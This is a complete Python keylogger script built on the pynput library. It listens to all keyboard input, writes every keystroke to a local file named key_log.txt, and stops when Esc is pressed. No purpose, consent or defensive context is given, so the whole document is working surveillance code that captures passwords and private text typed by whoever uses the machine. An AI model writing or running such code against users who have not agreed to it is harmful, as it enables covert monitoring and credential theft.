from pynput import keyboard

# Define the log file
log_file = "key_log.txt"

# Function to write keystrokes to the log file
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f"{key}")

# Function to handle release events (optional)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start listening to the keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
